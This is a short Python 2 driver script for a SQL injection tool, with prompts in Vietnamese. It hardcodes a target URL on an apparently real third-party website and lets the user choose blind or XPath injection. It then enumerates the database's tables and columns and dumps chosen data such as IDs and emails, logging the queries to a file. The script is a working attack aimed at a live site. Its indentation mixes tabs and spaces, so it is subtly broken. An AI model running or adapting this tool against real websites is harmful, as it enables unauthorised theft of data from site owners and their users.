from sqli import *



## Setting
inject_link = 'http://coex.com.vn/?option=hotro&catId=121 '
table_name = ''
column_name = ''

method = raw_input("Method (1: Quick Blind; 2: XPATH): ")
hdl = ''
if method == "1":
  from sqli_quick_blind import *
	## Quick blind
	hdl = SQLI_Quick_Blind()
	hdl.initialize()
	hdl.setLink(inject_link)
elif method == "2":
  from sqli_xpath import *
	## Quick blind
	hdl = SQLI_XPath()
	hdl.initialize()
	hdl.setLink(inject_link)
else:
	print "CAM ON BAN DA SU DUNG!"
	exit()
hdl.getInfo()
hdl.getTable()
hdl.printInfo()
finished = False
while not finished:
	table_name = raw_input("Nhap table: ")
	if table_name != '':
		hdl.getColumn(table_name)
		print hdl.params['column']
		column_name = raw_input("Nhap danh sach cot, cach nhau dau ',' (vd: id,email) : ")
		if column_name != '':
			hdl.getData(column_name,table_name)
		print hdl.params['data']
	confirm = raw_input("Ban muon tiep tuc? Nhan y hoac Y: ")
	if confirm != 'Y' and confirm != 'y':
		finished = True
print "Mo file log.txt de thay query va ket qua"
hdl.releaseResource()